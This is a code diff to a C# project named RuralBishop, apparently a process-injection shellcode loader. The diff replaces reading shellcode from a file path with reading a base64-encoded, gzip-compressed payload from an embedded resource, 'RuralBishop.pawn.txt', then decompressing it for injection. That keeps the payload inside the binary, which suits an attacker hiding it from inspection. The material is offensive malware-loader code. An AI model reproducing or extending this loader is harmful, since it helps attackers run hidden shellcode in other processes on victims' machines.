@@ -4,6 +4,7 @@ using System;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
+using System.Reflection;
 
 namespace RuralBishop
 {
@@ -215,24 +216,45 @@ namespace RuralBishop
 
         #endregion
 
-        public static Boolean PathIsFile(String Path)
+        private static string ExtractResource(string filename)
         {
-            try
+            var assembly = Assembly.GetExecutingAssembly();
+            var resourceName = filename;
+
+            using (Stream stream = assembly.GetManifestResourceStream(resourceName))
+            using (StreamReader reader = new StreamReader(stream))
             {
-                FileAttributes CheckAttrib = File.GetAttributes(Path);
-                if ((CheckAttrib & FileAttributes.Directory) == FileAttributes.Directory)
+                string result = reader.ReadToEnd();
+                return result;
+            }
+
+        }
+
+        static byte[] Decompress(byte[] gzip)
+        {
+            using (System.IO.Compression.GZipStream stream = new System.IO.Compression.GZipStream(new System.IO.MemoryStream(gzip),
+                System.IO.Compression.CompressionMode.Decompress))
+            {
+                const int size = 4096;
+                byte[] buffer = new byte[size];
+                using (System.IO.MemoryStream memory = new System.IO.MemoryStream())
                 {
-                    Console.WriteLine("[!] Please specify a file path not a folder path (-p|--Path)");
-                    return false;
+                    int count = 0;
+                    do
+                    {
+                        count = stream.Read(buffer, 0, size);
+                        if (count > 0)
+                        {
+                            memory.Write(buffer, 0, count);
+                        }
+                    }
+                    while (count > 0);
+                    return memory.ToArray();
                 }
             }
-            catch
-            {
-                Console.WriteLine("[!] Invalid shellcode bin file path specified (-p|--Path)");
-                return false;
-            }
-            return true;
         }
+
+     
 
         public static IntPtr GetProcessHandle(Int32 ProcId)
         {
@@ -291,12 +313,17 @@ namespace RuralBishop
             return Pv;
         }
 
-        public static SC_DATA ReadShellcode(String Path)
+        public static SC_DATA ReadShellcode()
         {
             SC_DATA scd = new SC_DATA();
             try
             {
-                scd.bScData = File.ReadAllBytes(Path);
+                //scd.bScData = File.ReadAllBytes(Path);
+                //scd.iSize = (uint)scd.bScData.Length;
+                string scode = ExtractResource("RuralBishop.pawn.txt");
+                byte[] blob = Convert.FromBase64String(scode);
+                //byte[] bScData = Decompress(blob);
+                scd.bScData = Decompress(blob);
                 scd.iSize = (uint)scd.bScData.Length;
             }
             catch { }
